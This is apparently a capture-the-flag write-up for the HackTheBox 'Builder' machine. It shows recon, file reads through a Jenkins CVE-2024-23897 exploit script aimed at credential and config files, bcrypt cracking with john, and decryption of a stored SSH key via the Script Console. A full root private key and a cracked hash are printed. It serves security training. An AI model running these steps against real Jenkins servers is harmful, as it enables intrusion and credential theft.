---
title: HTB Builder
date: 2024-10-21 08:50:00 +/-TTTT
categories: [Hackthebox, Linux]
tags: []     # TAG names should always be lowercase
description:  

image:
  path: assets/builder/cropped-builder.png
---

### Introduction
This machine challenges attackers to exploit a Jenkins server running on a vulnerable Linux host. The engagement begins with reconnaissance using tools like Nmap to identify open ports and services, revealing a Jetty HTTP server hosting Jenkins. Leveraging a known Local File Inclusion (LFI) vulnerability, attackers uncover sensitive files, such as configuration files and user credentials. A combination of enumeration, custom scripts, and manual testing highlights the  layers of Jenkins' structure. The task demands an understanding of Jenkins vulnerabilities, hash cracking, and privilege escalation techniques. 

### Nmap
```python
nmap -sC -sV 10.10.11.10             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 09:59 EDT
Nmap scan report for 10.10.11.10
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> fullport also returned the same ports.
#### Results
The results revealed the following open ports and services:

| Port | State | Service | Version                         |
| ---- | ----- | ------- | ------------------------------- |
| 22   | open  | ssh     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 |
| 8080 | open  | http    | Jetty 10.0.18                   |
Notably, the target service at port 8080 appears to host a Jenkins instance (`Jetty 10.0.18` server).

----
### Port 8080 (Jenkins)
The Jenkins interface, version `2.441`, is visible on accessing port 8080. Exposed version numbers of software often indicate a potential attack vector.

After navigating to port 80 you immediately see the Jenkins version number in the bottom, which after a quick google might be vulnerable to local file inclusion (CVE-2024-23897). https://www.exploit-db.com/exploits/51993

After clicking around some more i found 2 potential usernames:
![[Pasted image 20241021164626.png]]

#### Tech Stack
The site is clearly Jenkins, which describes itself as:
> The leading open source automation server, Jenkins provides hundreds of plugins to support building, deploying and automating any project.

As soon as I visit the page, the first request provides a `JSESSIONID` cookie:
```http
HTTP/1.1 200 OK
Date: Mon, 21 Oct 2024 14:03:23 GMT
X-Content-Type-Options: nosniff
Content-Type: text/html;charset=utf-8
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache,no-store,must-revalidate
X-Hudson-Theme: default
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: JSESSIONID.c5d604d5=node0pqwqm8dezj381gi0b3213xduh36.node0; Path=/; HttpOnly
X-Hudson: 1.395
X-Jenkins: 2.441
X-Jenkins-Session: 983bf83a
X-Frame-Options: sameorigin
X-Instance-Identity: 

MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuoLwaR1Kews72rSEsEkyDUFAKfX2Wk1mS06hi9A56Bx34LBdMQK3n6yCy0nJaT/KJcSx5hXA6DA1yNKWevPUO9nmgDZWaKxDhW/3uLvFtW68YnadxFiP7HLnRNulCWkaHgVIW/71MPrR9jOfjQ/BLPjBCBkLAdBsrCVrZ0/A/yj6H8YBGQIDk8hRjsqtMM0EBPzH/TylyC7DmHWtIkZqvLH7PKTycZ54Lcv9i9NVd/cLBZjEyzUua6n28OVsZif9yQ41qPmzwRlhZ7DAKi1wI48T+FatD9gz8v6KtjkftDht3CyT+GLYwUPy7z501y/RoOzldBpY2tgxvNTpIQgoDwIDAQAB

Content-Length: 14972
Server: Jetty(10.0.18)
```

---
### Exploitation
After trying to understand, and looking up what the vulnerability means, we found that the jenkins server is vulnerable to `local file inclusion`. 
- **Initial LFI Attempt**: Exploited the LFI vulnerability to access system files, such as `/etc/passwd`.
- Using the exploit:
![[Pasted image 20241021163621.png]]

---
Now let's try to exfiltrate some useful files, which didn't really work out, as I could not find any SSH keys.

After a hint to check the documentation I found that you can download a Jenkins client to the attack machine. 
![[Pasted image 20241021170005.png]]
And this even worked!
![[Pasted image 20241021170038.png]]

Then I checked the command that was needed to use to use this `.jar` file, because I have not seen it before like this.
```sh
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help bingbong
```
This was very hard so i stopped doing this..

---
### Hint
I got another hint to look at the output of the `/etc/passwd` file.
```c
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```
> this revealed that there was a user jenkins that has a home directory in the `/var/jenkins_home` folder. 

Managed to get the user flag with the following payloads:
```sh
python3 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/user.txt
```

Since I didn't know what files would be in this directory I searched on goolgle `typical file structure of Jenkins`, which returned me with a post with with the file structure. 

To test if this is correct I tried something simple from the jenkins_home folder:
```sh
python3 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/config.xml
```
This worked!!!

Within this file I found that which might be interesting:
```xml
<denyAnonymousReadAccess>false</denyAnonymousReadAccess>
```

*Note* 
> Lets say you find such vulnerability, you can read the documentation, or you can run a docker container locally on your host with that same version as follows.
```sh
docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
```

After some more research i found another possible jenkins file structure:
```xml
python3 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/users.xml 
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
```
This xml file reveals the content of `/users/users.xml`, which indicates that there is a user
```
jennifer_12108429903186576833
```
Now I will try to dive deeper into the directory structure:
```sh
python3 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```

Further analysis revealed sensitive configuration files stored within the Jenkins home directory:

- `config.xml`: Contains the `<denyAnonymousReadAccess>` setting, indicating misconfigurations.
- `users.xml`: Exposed user `jennifer` and an associated bcrypt hash:

This configuration file contains a `jbcrypt` hash:
```
#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
```
Also found a email address:
```xml
 <emailAddress>jennifer@builder.htb</emailAddress>
```

Hashcat could not identify the hash, but john managed to crack it pretty fast. 
```sh
john jennifer_hash

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 17 candidates buffered for the current salt, minimum 36 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst

princess         (jbcrypt)     

1g 0:00:00:07 DONE 2/3 (2024-10-21 14:06) 0.1426g/s 170.6p/s 170.6c/s 170.6C/s steve..bluebird
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
This did not allow me to login to SSH, but it logged into the Jenkins panel. 

---
### Initial Access
When we navigate to this link we can find the encrypted SSH key:
```http
view-source:http://10.10.11.10:8080/manage/credentials/store/system/domain/_/credential/1/update
```
Since I wasn’t sure about the password encryption Jenkins utilizes, I conducted a quick Google search and found decryption can be performed using `hudson.util.Secret` via the script console, accessible at “Dashboard” > “Manage Jenkins” > “Script Console”.

----
### Privilege Escalation
Using the discovered credentials, I logged into the Jenkins panel. I further explored Jenkins's "Script Console" to decrypt encrypted SSH keys stored in the configuration.

By executing the following print statement we can decrypt this key:
```sh
println(hudson.util.Secret.fromString("{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61hjEUdZtkPiX6buY1J4YKYFziwyFA1wH/X5XHjUb8lUYkf/XSuDhR5tIpVWwkk7l1FTYwQQl/i5MOTww3b1QNzIAIv41KLKDgsq4WUAS5RBt4OZ7v410VZgdVDDciihmdDmqdsiGUOFubePU9a4tQoED2uUHAWbPlduIXaAfDs77evLh98/INI8o/A+rlX6ehT0K40cD3NBEF/4ALG5xj3/1nqnieMhavTt5yipvfNJfbFMqjHjHBlDY/MCkU89l6p/xk6JMH+9SWaFlTkjwshZDA/oO/
<snip>
</snip>
xTRVFH/NFpuaw+iZvUPm0hDfdxD9JIL6FFpaodsmlksTPz366bcOcNONXSxuD0fJ5+WVvReTFdi+agF+sF2jkOhGTjc7pGAg2zl10O84PzXW1TkN2yD9YHgo9xYa8E2k6pYSpVxxYlRogfz9exupYVievBPkQnKo1Qoi15+eunzHKrxm3WQssFMcYCdYHlJtWCbgrKChsFys4oUE7iW0YQ0MAdcg/hWuBX878aR+/3HsHaB1OTIcTxtaaMR8IMMaKSM=}"))
```
![[Pasted image 20241021212614.png]]

### Root key
```sh
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
now SSH as root!!!!!!!!!!!!!!!!!

---


